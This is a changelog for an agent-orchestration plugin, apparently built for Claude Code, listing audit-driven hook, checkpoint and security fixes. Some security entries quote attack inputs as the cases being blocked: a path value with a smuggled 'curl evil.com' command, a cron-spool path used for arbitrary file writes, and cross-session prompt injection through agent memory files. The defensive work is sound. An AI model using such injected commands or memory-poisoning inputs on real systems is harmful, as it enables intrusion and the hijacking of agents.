# Changelog

## [2.52.2] - 2026-04-17

### Fixed

Driven by audit run 2026-04-17 (`tmp/audit/20260417-010632/`) — 52 findings (12 P1 / 23 P2 / 17 P3). This release resolves all 12 P1 findings. P2 and P3 remain tracked in the audit artifacts for subsequent patches.

#### Security (shell scripts)
- **SEC-001 (CWE-78) — Command injection via incomplete `bash -c` escape** in `scripts/enforce-bash-timeout.sh`. Replaced single-quote-only `sed` escape with `printf '%q'` full shell-quoting. Closes shell metacharacter pass-through (`;`, `&&`, `|`) inside the OPERATIONAL timeout wrapper.
- **SEC-002 (CWE-284) — Grep-based frontmatter parsing bypass** in `scripts/enforce-strive-delegation.sh`. Switched from `grep -o 'config_dir: .*' | sed` to `_get_fm_field()` from `lib/frontmatter-utils.sh`. Closes Layer 1 config-dir isolation bypass via crafted multi-line YAML.
- **SEC-003 (CWE-1333) — ReDoS via user-supplied talisman regex** in `scripts/enforce-bash-timeout.sh`. When neither `timeout` nor `gtimeout` is available (stock macOS without coreutils), the fallback now skips user patterns entirely instead of running unguarded `grep -qE`. Closes DoS vector on the 3-second PreToolUse hook.

#### Correctness (logic bugs)
- **FLAW-001 — Missing jq fallback silently abandons test batches** in `scripts/arc-phase-stop-hook.sh:527`. Added `|| echo 0` fallback to `executed=$(jq ...)` to prevent ERR-trap-masked silent exit when `testing-plan.json` is empty or corrupt.
- **FLAW-002 — Checkpoint recovery path skips char-set re-validation** in `scripts/arc-phase-stop-hook.sh`. Added regex validation after Strategy 2 (scan) reassigns `CHECKPOINT_PATH` to prevent sed delimiter corruption on paths containing `|`.

#### Spec compliance (ATE-1)
- **DEAD-001 / DEAD-002 — Named `subagent_type` violations** in `arc-phase-design-prototype.md` (proto-worker) and `arc-phase-design-iteration.md` (design-iterator). Replaced with `subagent_type: "general-purpose"` and inject agent body via `Read()` + prompt-stuffing. Pattern mirrors `arc-phase-storybook-verification.md:274`.

#### Cleanup infrastructure
- **CLEAN-001 — arc-phase-inspect.md had no cleanup section**. Added STEP 3.5 with full 5-component canonical cleanup (dynamic discovery → force-reply → shutdown → retry-with-backoff → QUAL-012 fallback). Fallback array covers all 5 inspector agents + verdict-binder.
- **CLEAN-002 — arc-phase-inspect-fix.md had no cleanup section**. Same pattern; fallback derives from `spawnedAgentNames` (with a spawn-crash-path secondary fallback).
- **CLEAN-003 — arc-phase-test.md no inline fallback array**. Added `spawnedAgentNames` tracking for dynamic `batch-runner-N` / `batch-fixer-N-fix-M` names. STEP 10 cleanup now issues best-effort `shutdown_request` to tracked names and gained a 2-stage SIGTERM→SIGKILL process kill (MCP-PROTECT-003 `--stdio` guard) in the filesystem fallback.

#### Team lifecycle
- **TEAMLIFE-001 — Layer 2 plan-inspect team cleaned via unconditional rm-rf** in `arc-phase-plan-review.md:533-534`. Added best-effort `try { TeamDelete() } catch {}` after the rm-rf with an inline QUAL-012 exemption comment explaining why the filesystem-first pattern is correct here (SDK tracks Layer 1 as current team).

### Reclassified as FALSE_POSITIVE
- **CLEAN-004** (audit finding about 4 phase files missing config.json read pattern): all 4 flagged files (`arc-phase-design-verification.md`, `arc-phase-ux-verification.md`, `arc-phase-design-iteration.md`, `arc-phase-deploy-verify.md`) already implement the canonical 5-component cleanup. The audit misread the `if (!cleanupTeamDeleteSucceeded)` branch as "skipping shutdown_request" — shutdown_request runs BEFORE the retry loop per `engines.md shutdown()`. Documented in the mend resolution report for auditor review.

### Resolution report
Full per-finding evidence: `tmp/mend/20260417-010632/resolution-report.md`.

## [2.52.1] - 2026-04-15

### Fixed
- **Talisman silent parse failure (P1)** — `scripts/talisman-resolve.sh` now detects and reports YAML parse failures instead of silently falling back to defaults. Root cause of intermittent arc checkpoint bugs where user config values (e.g., `arc.ship.auto_merge: true`) were silently overridden by hardcoded defaults (`false`).
  - `yaml_to_json()`: Python fallback now uses `sys.exit(1)` on exception instead of `print('{}')`, so bash can distinguish parse failure from empty file. Zero-byte guard added.
  - `yq` fallback: distinguishes parse error from null-document output.
  - Parse failures tracked via tempfile (subshell-safe — function runs inside `$()` where parent-shell globals don't propagate).
  - `MERGE_STATUS="parse_failed"` set when any source file failed to parse.
  - `_meta.json.sources.project/global` set to `null` for files that failed to parse (was misleadingly showing the file path).
  - When project/global YAML fails to parse, shards write to project dir (not system cache) so the degraded state is visible to downstream consumers.
  - System-cache fast-path refuses to re-serve stale shards when cached `merge_status` indicates a prior failure.
  - User-facing warning emitted via stderr and `hookSpecificOutput` JSON for Claude Code SessionStart.
- **MCP `echo-search` YAMLError handling (P1)** — `scripts/echo-search/config.py::_try_load_talisman_file` now catches `yaml.YAMLError` explicitly at warning level. Previously, malformed talisman.yml could crash the echo-search MCP server's talisman load path.
- **MCP `agent-search` merge_status awareness (P1)** — `scripts/agent-search/server.py::_load_talisman_user_agents` now reads `_meta.json.merge_status` and emits a warning when shards are in `parse_failed` state, so operators can diagnose why custom user_agents aren't registering.

### Audit reference
Driven by talisman subsystem audit run 2026-04-15 (16 findings, 7 P1). This release addresses 6 of the 7 P1 findings (001, 002, 003, 004, 005, 006, 007 from audit report). Remaining findings (MCP `merge_status` refusal in more consumers, concurrent write lock, schema doc clarification) deferred to future patches.

## [2.52.0] - 2026-04-15

### Added
- `--step-groups` flag for `/rune:arc` — pauses at phase group boundaries for context-optimized execution
- `PHASE_GROUPS` constant in `arc-phase-constants.md` with preflight coverage assertion
- `_lookup_phase_group()` Bash mirror in `arc-phase-stop-hook.sh` (extracted to `lib/phase-groups.sh`)
- Group boundary detection with convergence guard (AC-4) and skipped-group signal (AC-7)
- Group pause/resume support via `group_mode`/`group_paused` state file fields
- Schema v28→v29 migration for `flags.step_groups`
- `[group N/M]` progress prefix in phase dispatch prompt

## [Unreleased]

### Added
- **Echo-to-Skill Promotion** (`/rune:learn --detector skill-promotion`): New detector in `/rune:learn` that scans Etched and Notes tier echoes for procedural patterns (action-keyword density, code references, access-count validation) and suggests promoting qualifying candidates to project-level Agent Skills (`.claude/skills/<slug>/SKILL.md`). Never auto-creates — always gated by `AskUserQuestion` with first-run banner and session-wide "Skip all" support. Includes `user-invocable` heuristic that routes workflow-shaped echoes to `true` (slash command) and constraint-shaped echoes to `false` (autoload background knowledge). Dedup guard compares new drafts against existing `.claude/skills/*/SKILL.md` via dual-gate Jaccard (title_ratio > 0.6 OR content_ratio > 0.7), offering "Update existing" when a match is found.
- **`echoes.skill_promotion` talisman section**: Config gate with `enabled` (bool, default `true`), `min_access_count` (int, default `5`), `min_score` (float, default `0.6`), and `target` (string: `project` | `user`). Documented in `talisman-sections.md` with tier-eligibility table and interaction notes vs. existing Observations→Inscribed auto-promotion flow (which retains its `_PROMOTION_THRESHOLD=3` auto-bar).
- **`plugins/rune/skills/learn/references/skill-promotion.md`**: Detector algorithm, scoring formula (clamped to [0, 1]), `user-invocable` heuristic, draft generator, dedup guard, write protocol. Canonical reference for promotion logic.
- **`plugins/rune/scripts/echo-search/test_skill_promotion_scoring.py`**: 9 unit tests locking the scoring formula — positive fixtures (procedural echo crossing threshold), negative fixtures (neutral prose below threshold), clamping checks (raw score overflow → 1.0), and boundary behavior (exactly-at-threshold, length-only spam).
- **Idempotent talisman init** (`init-protocol.md`): `echoes.skill_promotion` defaults only emitted when the subkey is absent, preserving user customizations across `/rune:talisman init` and `/rune:talisman update` invocations. Documented as a general rule for all `echoes:` subkeys.
- **`artifact_search` MCP tool**: New tool on the echo-search MCP server that searches past arc run artifacts (TOME findings, resolution reports, work summaries, gap analyses, inspect verdicts). Enables cross-session queries like "what did the last review find about auth?" powered by a separate FTS5 SQLite index (`artifacts.db`).
- **Pre-rest artifact extraction** (`commands/rest.md` Step 4.5): Before `/rune:rest` deletes `tmp/`, key artifacts are extracted to `.rune/arc-history/{arc-id}/`. Includes configurable retention policy (`max_runs`, default 10) and talisman-gated enable flag.
- **Artifact DB V5 schema migration** (`database.py`): Additive `artifact_entries` + `artifact_entries_fts` tables with BM25 FTS5 index. Separate `ensure_artifact_schema()` prevents echo tables from leaking into `artifacts.db`.
- **`artifact_indexer.py`**: Parser module for TOME findings (severity/prefix/description extraction), resolution reports, work summaries, gap analyses, and inspect verdicts. Deterministic SHA-256 entry IDs for idempotent indexing.
- **Dirty-signal integration** (`annotate-hook.sh`): PostToolUse hook now detects writes to `.rune/arc-history/` and writes `.artifact-dirty` signal for lazy reindex on next `artifact_search` call.
- **Config constants** (`config.py`): `ARTIFACT_DB_PATH`, `ARC_HISTORY_DIR`, `_check_and_clear_artifact_dirty()` following the existing dirty-signal helper pattern.
- **Talisman `echoes.artifact_indexing` section**: New config subsection with `enabled` (bool), `max_runs` (int), and `artifact_types` (list) fields. Documented in `talisman-sections.md`.

## [2.51.1] - 2026-04-15

### Fixed

- **ARC-002+003**: Added missing `rune-mend-deep-` and `rune-verify-` prefixes to `PHASE_PREFIX_MAP` in `arc-phase-cleanup.md` — prevents orphaned teams going undetected after crash recovery
- **FLAW-002**: Added numeric validation for `_rune_kill_tree` return value in `team-shutdown.sh` — prevents `-gt` comparison crash under `set -e`
- **PAT-001**: Synchronized state file workflow patterns across `enforce-bash-timeout.sh`, `enforce-polling.sh`, and `enforce-glyph-budget.sh` — added missing `.rune-codex-review-*`, `.rune-resolve-todos-*`, `.rune-self-audit-*` patterns
- **FLAW-001**: Clarified `*)` fallback case in `echo-append.sh` argument parser with explicit `shift; continue`
- **SEC-001**: Added character-set sanitization for `workflow_label` and `fallback_members` in `team-shutdown.sh` diagnostic JSON — prevents JSON injection via untrusted string fields
- **FLAW-004**: Unified dual timestamp variables in `detect-workflow-complete.sh` — replaced `HOOK_START_TIME` with `_HOOK_START_EPOCH` to eliminate 1-3s timing inconsistency
- **FLAW-007**: Added missing `_trace()` function definition in `on-session-stop.sh` — was causing silent ERR trap on line 280, making defer path invisible in trace logs
- **FLAW-008**: Added path canonicalization and whitespace trimming for `checkpoint_path` in `enforce-strive-delegation.sh` — prevents relative path resolution against wrong CWD
- **ARC-004+005**: Updated stale checkpoint schema version claims from v20/v23 to v28 in `arc/SKILL.md` and `arc-checkpoint-init.md`

## [2.51.0] - 2026-04-14

### Added

- **`lib/team-shutdown.sh`** — Extracted the 80-line team shutdown fallback pattern (Steps 5-6: process kill + filesystem cleanup + diagnostic) into a shared library with `rune_team_shutdown_fallback()`. Session-isolated, MCP-safe (uses `_rune_kill_tree "teammates"`), Bash 3.2 compatible. Sourcing guard prevents double-load.
- **`validate-shutdown-pattern.sh`** — PreToolUse hook (SHUTDOWN-DRIFT) that verifies the 3 canonical consumers of the shutdown fallback pattern source `lib/team-shutdown.sh` instead of inlining the pattern. Advisory only — never blocks writes. OPERATIONAL (fail-forward).
- **`test-team-shutdown.sh`** — 8 bats test scenarios for `rune_team_shutdown_fallback()` covering happy path, session isolation, invalid input, and edge cases.
- **SHUTDOWN-DRIFT Pre-Commit Checklist entry** in `plugins/rune/CLAUDE.md`.

### Changed

- **`engines.md` Step 5** — Delegates to `source lib/team-shutdown.sh` + `rune_team_shutdown_fallback()` instead of inline 80-line pattern.
- **`orchestration-phases.md`** — Delegates Step 5 shutdown fallback to shared library.
- **`phase-7-cleanup.md`** — Delegates Step 5 shutdown fallback to shared library.
- **`team-lifecycle-reviewer.md`** — Added TLC-006 finding for inline Step 5 patterns that should source `lib/team-shutdown.sh`. Updated description and severity guide.
- **`CLAUDE.md` inline pattern** — Updated to pointer referencing `lib/team-shutdown.sh`.

## [2.50.2] - 2026-04-14

### Fixed

- **Audit 20260414-194615 — 14 findings resolved, 1 deferred to follow-up plan, 2 question/nit.** Focused audit of shell scripts, hooks, arc skill, and team lifecycle produced 18 findings (3 P1, 6 P2, 7 P3, 1 Q, 1 N). Direct-orchestrator mend applied (scope narrow, mend-fixer truncation risk high):
  - **VP-001** (`skills/team-sdk/references/engines.md:532-561`, `.claude/CLAUDE.md:288`): Corrected comments asserting `Bash("sleep 2", { run_in_background: true })` is a synchronization barrier. Per Core Rule #9, the sleep runs concurrently with the next step — the force-reply pattern is BEST-EFFORT / OPPORTUNISTIC, not guaranteed. Guaranteed shutdown comes from retry loop (Step 4) + filesystem fallback (Step 5), not from Step 2b sequencing.
  - **VP-002** (`skills/team-sdk/references/engines.md:564-591`): Gated `pgrep -P $PPID` liveness check to `teammateMode === "tmux"` only. In `auto`/`in-process` modes teammates share the parent PID — the probe always returns empty, making `confirmedDead` (SendMessage throw count) the authoritative liveness signal.
  - **VP-003** (`scripts/session-team-hygiene.sh:1-22, 141-158`): Clarified scope comment (auto-clean is SAME-SESSION PID-dead only) and improved report logic to surface cross-session orphans where `owner_pid` is verifiably dead. Previously the `session_id != HOOK_SESSION_ID` skip hid crash-recovery orphans from the report entirely.
  - **VP-004** (`skills/team-sdk/references/engines.md:503-522`): Added TODO block acknowledging the force-reply pattern's GitHub #31389 citation lacks a version pin — before next MINOR bump, add regression test that spawns a teammate and issues shutdown without force-reply to determine if the underlying bug is still present.
  - **VP-005**: DEFERRED_TO_PLAN — extraction of 80-line pattern into `lib/team-shutdown.sh` is a larger refactor. Follow-up plan written (gitignored `plans/`) with Grounding Gate verification (0.978 evidence score, BLOCK-addressed via `hooks.json` PreToolUse automation).
  - **VP-006** (`skills/team-sdk/references/engines.md:658-696`): Reordered MCP-PROTECT-003 Step 5a so deterministic `_rune_kill_tree "teammates"` (bash implementation with positive PID whitelist + 3-layer binary detection) is the MANDATORY primary path. Inline LLM-classification steps demoted to REFERENCE ONLY comment block — LLM classification of `ps` output in a degraded state is the weakest possible safety mechanism.
  - **VP-007** (`skills/team-sdk/references/engines.md:375-395`): Added caveat to `shutdownWave()` documenting that "recently sent SendMessage" is a CONTRACT (not enforced invariant) and flagging the intentional grace-period asymmetry with `shutdown()` (flat 20s vs adaptive scaling).
  - **VP-008** (`scripts/verify-team-cleanup.sh:64-92`): TLC-002 now filters team dirs by session ownership using `.session` marker + `kill -0` liveness check. Previously `HOOK_SESSION_ID` was extracted but never used — one session's TeamDelete reported zombie warnings about another session's live teams.
  - **SEC-001** (`scripts/on-task-observation.sh:34-43`): Added `case` guard restricting `RUNE_TRACE_LOG` to `${TMPDIR:-/tmp}/` (canonical mitigation from `on-session-stop.sh:38-41`). Prevents env-controlled redirect of trace output to arbitrary writable paths (cron spool, authorized_keys) with attacker-influenced content.
  - **SEC-002** (`scripts/on-task-observation.sh:66-85`): Route `TASK_SUBJECT`/`TASK_DESC` through `sanitize_untrusted_text()` from `lib/sanitize-text.sh` before they reach `.rune/echoes/*/MEMORY.md`. Blocks persistent cross-session prompt injection via YAML frontmatter, code fences, or directive prefixes in LLM-generated task data that would otherwise be re-injected at next session start.
  - **SEC-003** (`scripts/on-task-completed.sh:131-138`): Added SEC-4 char-set validation for `TEAMMATE_NAME` before interpolation into dup-check path. Matches existing guard in `on-teammate-idle.sh:64`.
  - **SEC-004** (`scripts/on-task-observation.sh:38`): Default `RUNE_TRACE_LOG` now includes `${PPID}` suffix for session isolation (matches 40+ other scripts). Previously was the sole exception.
  - **SEC-005** (`scripts/elicitation-result-validator.sh:110-118`): Added Unicode direction override guard (U+202A-202E, U+2066-2069) to block homoglyph/spoofing attacks in elicitation responses flowing into MCP tool calls.
  - **SEC-006** (`scripts/on-task-observation.sh:86`): Validate `AGENT_NAME` char-set before MEMORY.md injection to prevent markdown injection in the `**Source**:` line.
  - **SEC-007** (`scripts/on-task-observation.sh:26`): Fixed `_rune_fail_forward` fallback path to include `${PPID}` suffix, eliminating session-isolation bypass when crash occurs before line 34's guard.
  - **AGT-SPAWN-001** (`skills/roundtable-circle/references/task-templates.md:136`): Added inline `// WARNING: NOT FOR RUNE WORKFLOWS` comment inside the "Platform Reference" code block so the no-`team_name` pattern isn't accidentally copied into Rune workflows.

  Audit confirmed: zero deprecated `Task()` spawn calls across ~80+ sites (2.1.63 rename fully adopted). Ward Sentinel security sweep found 0 P1 issues and confirmed hardened state of `process-tree.sh` (MCP-PROTECT-003), `workflow-lock.sh`, `elicitation-result-validator.sh`. Unit tests improved: `test-session-team-hygiene.sh` 8/11 → 9/11 (one pre-existing failure fixed as side-effect of VP-003 clarification).

## [2.50.1] - 2026-04-14

### Fixed

- **ARC-FORGE-001** (`skills/arc/references/arc-phase-forge.md`): Restored the "mark-before-work" contract and the missing `/rune:forge` delegation call in the forge phase pseudocode. Previously, `updateCheckpoint({status: "in_progress"})` was called at line 82 — **after** state-file discovery, which only succeeds post-delegation — meaning the checkpoint transitioned `pending → in_progress → completed` in one burst. A forge crash mid-enrichment left the checkpoint stuck at `pending`, indistinguishable from "never started", defeating `/rune:cancel-arc` discovery and crash-recovery resume. Additionally, the actual `Skill("rune:forge", forgePlanPath)` invocation was absent from pseudocode — only comments described delegation, leaving dispatcher-to-skill handoff implicit and ambiguous. Fix splits STEP 2 into 2a (stale-file cleanup, pre-delegation) / 2b (explicit `Skill("rune:forge", ...)` call with required `rune:` namespace prefix) / 2c (post-delegation team_name discovery + validation), and adds a new STEP 1.5 that calls `updateCheckpoint({status: "in_progress", team_name: null})` before any work — mirroring the canonical pattern in `arc-phase-mend.md:87`. Two checkpoint writes preserve both phase visibility (null team upfront) and cancel-arc discovery (team_name backfilled after `/rune:forge` writes its state file).

- **ARC-FORGE-001 (variant sweep)**: Applied the same mark-before-work contract to three additional phases that exhibited the identical bug (`TeamCreate` fired before any `status: "in_progress"` checkpoint write):
  - `skills/arc/references/arc-phase-test-coverage-critique.md` (Phase 7.8) — `TeamCreate` at line 40 previously had no `in_progress` checkpoint before it; first `updateCheckpoint` was `status: "completed"` at line 163.
  - `skills/arc/references/arc-phase-task-decomposition.md` (Phase 4.5) — `TeamCreate` at line 52 previously had no `in_progress` checkpoint before it; only a `status: "skipped"` path at line 28 and `status: "completed"` at line 180.
  - `skills/arc/references/arc-phase-pre-ship-validator.md` (Phase 8.55 `release_quality_check` — the embedded second phase, NOT Phase 8.5 `pre_ship_validation` which was already clean) — `TeamCreate` at line 577 previously had no `in_progress` checkpoint before it; first `updateCheckpoint` was `status: "completed"` at line 690.
- **ARC-STORYBOOK-001** (`skills/arc/references/arc-phase-storybook-verification.md`): Replaced direct `checkpoint.phases.storybook_verification.status = "in_progress"` object mutation (which fired AFTER `TeamCreate` at line 219) with a proper `updateCheckpoint({status: "in_progress", team_name: null})` call moved BEFORE `TeamCreate`. Consistent with the canonical pattern used by every other phase and closes the same crash-recovery visibility gap as ARC-FORGE-001.

All four fixes follow the two-step pattern: (1) `updateCheckpoint({status: "in_progress", team_name: null})` before `TeamCreate`, (2) backfill `team_name` in a second `updateCheckpoint` after `TeamCreate` succeeds. Preserves phase visibility for crash recovery while still surfacing the real team name to `/rune:cancel-arc` for team-shutdown targeting.

Version bumped PATCH because this is a documentation/pseudocode-level fix — no agent, skill, command, or talisman schema changes. Upgrade recommended for anyone relying on `/rune:arc --resume` or `/rune:cancel-arc` to correctly detect forge, test-coverage-critique, task-decomposition, release-quality-check, or storybook-verification phase state.

## [2.50.0] — 2026-04-14
### Added
- Inner Flame Layer 0: pre-execution assumption gate (`validate-assumption-gate.sh`) — PreToolUse:Write|Edit|NotebookEdit hook that gates first write per strive task on `[ASSUMPTION-N]` declaration in the worker's task file. Pass marker written on allow; subsequent writes bypass re-check. Talisman-gated via `inner_flame.assumption_gate.*`.
- Worker Report template: `### Assumptions` and `### Assumption Outcome` sections for strive worker tasks.
- Talisman config: `inner_flame.assumption_gate.*` keys (`enabled`, `min_assumptions`, `block_on_missing`, `persist_to_echoes`) with defaults in `talisman-defaults.json` and documentation in `configuration-guide.md` and `talisman.example.yml`.
- Echo role: `.rune/echoes/assumptions/` for assumption lifecycle tracking (via `persist_to_echoes`).

## [2.49.1] - 2026-04-14

### Fixed

- **HOOK-002** (`hooks/hooks.json`): Removed the `_StopFailure_disabled` key that was introduced in 2.48.0 as an inert rename to "disable" the orphan StopFailure hook. Modern Claude Code now validates `hooks.*` keys against a closed enum of 27 canonical event names (PreToolUse, PostToolUse, StopFailure, etc.) and hard-fails the entire file on any unknown key, rather than ignoring it as prior versions did. Symptom: `Failed to load hooks from .../hooks.json: [{"code":"invalid_key", "path":["hooks","_StopFailure_disabled"]}]` — **every Rune hook stopped firing** (enforce-teams, on-session-stop, arc-phase-stop-hook, context-percent-stop-guard, and ~40 others), silently breaking arc loops, stop-hook-driven cleanup, and security enforcement. The `on-stop-failure.sh` script remains on disk as an orphan pending migration to either `StopFailure` (now a valid event as of Claude Code v2.17.1) or inlining into `Stop` with branch detection; CLAUDE.md audit note T5/HOOK-001 still applies and the API-error checkpoint preservation path remains inactive until that migration decision lands.

Version bumped PATCH because this is a pure hook-config repair — no agent, skill, command, or talisman schema changes. Upgrade is strongly recommended for anyone on 2.48.0 or 2.49.0, since hook loading is all-or-nothing: one invalid key disables every hook in the file.

## [2.48.0] - 2026-04-14

### Fixed

Resolves all 10 P1 findings from `tmp/audit/20260414-012408/TOME.md` — stop-hook + migration + checkpoint hardening.

- **T1 / FLAW-002+BACK-001+RUIN-002** (`lib/rune-state.sh`): Migration lock `rmdir` replaced with `rm -rf` at both exit points; added stale-lock detection (`find -mmin +5`) on acquire so crashed prior sessions self-heal instead of silently skipping `.claude/→.rune/` migration forever.
- **T2 / STOP-002** (`arc-batch-stop-hook.sh:458-461`): `_abort_batch` else-branch no longer falls back to direct `> PROGRESS_FILE` overwrite on mktemp failure. Preserves existing progress (resumable via `--resume`) instead of risking 0-byte truncation from a mid-write kill.
- **T3 / STOP-003** (`on-session-stop.sh`): Sources `arc-stop-hook-common.sh` and replaces 8 bare `rm -f` on loop state files with `arc_delete_state_file()` (3-tier guard). Reopens the v1.101.1 infinite-loop bug on immutable filesystems would have recurred without this. Inline fallback shim added for defensive boot.
- **T4 / STOP-001** (`context-percent-stop-guard.sh`): Uses `resolve_cwd()` from `stop-hook-common.sh` (CLAUDE_PROJECT_DIR fallback) and short-circuits on empty CWD before the threshold block. Prevents two competing exit-2 prompts when arc phase loop is active but CWD is absent from Stop input.
- **T5 / HOOK-001** (`hooks/hooks.json`, `on-stop-failure.sh`, `CLAUDE.md`): `StopFailure` is not a valid Claude Code hook event. Entry renamed to `_StopFailure_disabled` (Claude Code ignores unknown keys), script header marked as orphan pending migration, CLAUDE.md hook table corrected. Users now know API-error checkpoint preservation is NOT active.
- **T6 / SEC-002** (`arc-batch-stop-hook.sh`, `arc-hierarchy-stop-hook.sh`, `arc-issues-stop-hook.sh`): GUARD 9/11 upgraded from non-anchored negative char-class to explicit anchored positive match `^[a-zA-Z0-9._/-]+$`. Prevents NEXT_PLAN / NEXT_CHILD prompt injection via crafted paths like `plan.md; curl evil.com #`.
- **T7 / SEC-001+SEC-009** (`detect-workflow-complete.sh`, `on-session-stop.sh`): TMPDIR/tmp allowlist case-pattern applied to `RUNE_TRACE_LOG` before any trace write. Blocks arbitrary-file-write via `RUNE_TRACE_LOG=/var/spool/cron/crontabs/user` + `RUNE_TRACE=1`. Matches canonical mitigation in `session-team-hygiene.sh:71-74`.
- **T8 / RUIN-001+RUIN-005** (`learn/echo-writer.sh`, `on-task-observation.sh`): `cat TMPFILE >> MEMORY_FILE` replaced with stage-to-sibling-temp + atomic `mv -f`. A killed or timed-out append no longer corrupts the MEMORY.md echo index.
- **T9 / RUIN-004** (`lib/checkpoint-update.sh`): Post-write non-empty + valid-JSON verification before `mv`; best-effort `sync` after `mv` for durability; clearer ENOSPC / disk-full diagnostics. Prevents silent revert of completed arc phases when a write truncates.
- **T10 / FLAW-001** (`rune-statusline.sh`): `USED`/`REMAINING` normalized to `0`/`100` when missing or non-numeric, before arithmetic `[[ -ge ]]` compares. Prior `[[ "" -ge 90 ]]` was a fatal bash error that triggered the ERR trap, leaving `context-percent-stop-guard` and `rune-context-monitor` reading stale bridge data.

Version bumped MINOR because `hooks.json` renames a hook key and `on-session-stop.sh` introduces a new library dependency — both observable contract changes, though neither breaks existing behavior.

## [2.47.2] - 2026-04-14

### Fixed
- **Version & count sync**: Root README badges updated from v2.44.1 to v2.47.2, agent count 151→152, skills 61→69
- **Root README**: Updated arc phase count 44→45, architecture tree directory counts (utility 16→17, work 6→7, skills 62→69, core agents 108→109)
- **Root README skills table**: Added 7 missing skills (codex-status, verify, react-composition-patterns, react-native-patterns, react-performance-rules, react-view-transitions, web-interface-rules)
- **plugin.json & marketplace.json**: Corrected agent description from "153 (110 core)" to "152 (109 core)" to match actual file counts
- **Plugin README**: Added per-category breakdown in agent architecture section

## [2.47.1] - 2026-04-14

### Fixed

Resolves 17 audit findings from `tmp/audit/20260413-213105/TOME.md` (2 P1 + 5 P2 + 10 P3).

- **arc-phase-bot-review-wait.md** (CLEAN-001, P1): Added `{ run_in_background: true }` to 4 blocking `Bash("sleep N")` calls (lines 115/175/370/434). The default 120s initial wait previously froze the LLM harness for the full duration, wasting budget and risking stop-hook timeouts.
- **Test fixtures** (PATT-001, P1): Added session-isolation triple (`config_dir`, `owner_pid`, `session_id`) to `test-worktree-gc.sh:153,158,163` and `test-enforce-glyph-budget.sh:108` so fixtures encode the full Rune Session Isolation Rule schema. `test-validate-strive-worker-paths.sh` comments now explicitly flag the intentional `owner_pid` omission as a test-harness-only workaround (not a schema contract).
- **Arc phase sleeps** (CLEAN-002, P2): Added `{ run_in_background: true }` to 14 sleep call-sites across 10 arc phase reference files (arc-phase-mend, arc-phase-plan-review, gap-remediation, gap-analysis, arc-codex-phases, arc-phase-test, arc-phase-test-coverage-critique, arc-preflight, arc-phase-pr-comment-resolution, arc-phase-merge). Eliminates cumulative wall-time waste on TeamDelete retry backoffs (3s/6s/10s) during arc runs.
- **arc-phase-qa-gate.md** (CLEAN-003, P2): Renamed `plan_refinement` → `plan_refine` in illustrative PHASE_ORDER blocks to match the canonical name used by `arc-phase-constants.md` and `arc-phase-stop-hook.sh`. Prevents checkpoint-key mismatch when maintainers follow the qa-gate illustration.
- **enforce-bash-timeout.sh** (BACK-002, P2): Added three-tier `command -v timeout` / `gtimeout` / bare-grep fallback at both ReDoS-guard call sites. Stock macOS without coreutils now evaluates user-supplied talisman patterns instead of silently treating exit 127 from missing `timeout` as "no match".
- **on-teammate-idle.sh** (BACK-003, P2): Deleted broken inline `resolve_path` BSD fallback (`readlink -f`, `realpath -m`, `grealpath` all have BSD/GNU drift bugs that could return the literal path unchanged, allowing SEC-004 boundary-check bypass via string-prefix match). Now fails closed with `exit 2` if `lib/platform.sh` is missing; otherwise delegates unconditionally to canonical `_resolve_path`.
- **orchestration-phases.md** (TLC-001, P2): Added `{ run_in_background: true }` to the inter-wave `WAVE_CLEANUP_DELAYS` retry sleep at line 503. Matches canonical `engines.md:607` pattern.
- **arc-phase-cleanup.md** (CLEAN-004, P3): Updated stale `"23 delegated phases"` comment to `"34 delegated phases"` with a framing that discourages future drift.
- **arc-preflight.md** (CLEAN-005, P3): Separated `rune-audit-` prefix onto its own line in `ARC_TEAM_PREFIXES` with an explicit comment clarifying it is retained as a cross-workflow safety net for standalone `/rune:audit` orphans, NOT spawned by arc.
- **talisman-resolve.sh** (PATT-005, P3): Replaced hardcoded `$HOME/.claude` fallback at line 521 with the `${CLAUDE_CONFIG_DIR:-$HOME/.claude}` CHOME pattern. Prevents multi-account users from being silently redirected to the default account when the `cd` to their primary config dir fails.
- **mend/phase-7-cleanup.md** (TLC-002, P3): Updated step-2 summary to include the force-reply pre-message (2a) → sleep (2b) → shutdown_request (2c) sequence with an `engines.md` cross-link (GitHub #31389 rationale).
- **resolve-session-identity.sh** (BACK-004, P3): Added explicit `source lib/platform.sh` block at script top (following `find-teammate-session.sh` pattern). Eliminates 2 wasted `stat` forks per macOS hook cold-start.
- **doc-pack-staleness.sh** (BACK-005, P3): Removed brittle inline `date -d || date -j -f "%Y-%m-%d"` fallback that silently returned 0 on timezone-bearing ISO-8601 timestamps (masking pack staleness). Now relies on canonical `_parse_iso_epoch` from the already-sourced `platform.sh`.
- **arc-batch-stop-hook.sh** (BACK-007, P3): Reordered `sed | head` → `head | sed` in SEC-009 git-log sanitization. Combined with `set -o pipefail`, eliminates the SIGPIPE race where a malicious commit message on line 21+ could escape backtick sanitization.
- **enforce-gh-account.sh** (SEC-001, P3): Added explicit integer validation (`[[ "$marker_time" =~ ^[0-9]+$ ]] || marker_time=0`) after `cat "$DEBOUNCE_MARKER"`. Documents intent and prevents future refactors from removing the implicit arithmetic-coercion sanitization.
- **session-team-hygiene.sh** (BACK-N-001): Replaced stale `BACK-002 NOTE` comment at 442 with accurate `platform.sh _stat_mtime` reference.

### Deferred

Codemod-scope findings from the same TOME are tracked for dedicated follow-up PRs:

- PATT-002/PATT-003: Log prefix standardization (new `lib/log.sh` + migration across 30+ scripts).
- PATT-004: Shebang normalization (~85 files).
- BACK-006/SEC-002: Platform helper consolidation (`_epoch_to_datetime`, `_resolve_chome` additions to `lib/platform.sh`).
- SEC-003: Support-script strict-mode audit with CI lint.
- TLC-003/TLC-004: VEIL-002 pgrep liveness check in `postPhaseCleanup`/`verify` (accepted design tradeoff — retry-with-backoff provides equivalent coverage).
- BACK-001 was a FALSE_POSITIVE against the current tree — every listed script already declares `set -euo pipefail`; the finding snapshot predated upstream fixes.

Full per-finding disposition report: `tmp/mend/20260413-213105/resolution-report.md`.

## [2.47.0] - 2026-04-13

### Added
- New `blind-verifier` agent in `agents/work/` — post-strive AC-only verification that independently validates implementation without seeing diffs or worker output (eliminates anchoring bias)
- Phase 4.6 Blind Verification in strive quality-gates — conditional, opt-in via `blind_verification.enabled`
- `blind_verification` talisman section with configurable model, timeout, and remediation settings

## [2.46.2] - 2026-04-13

### Fixed
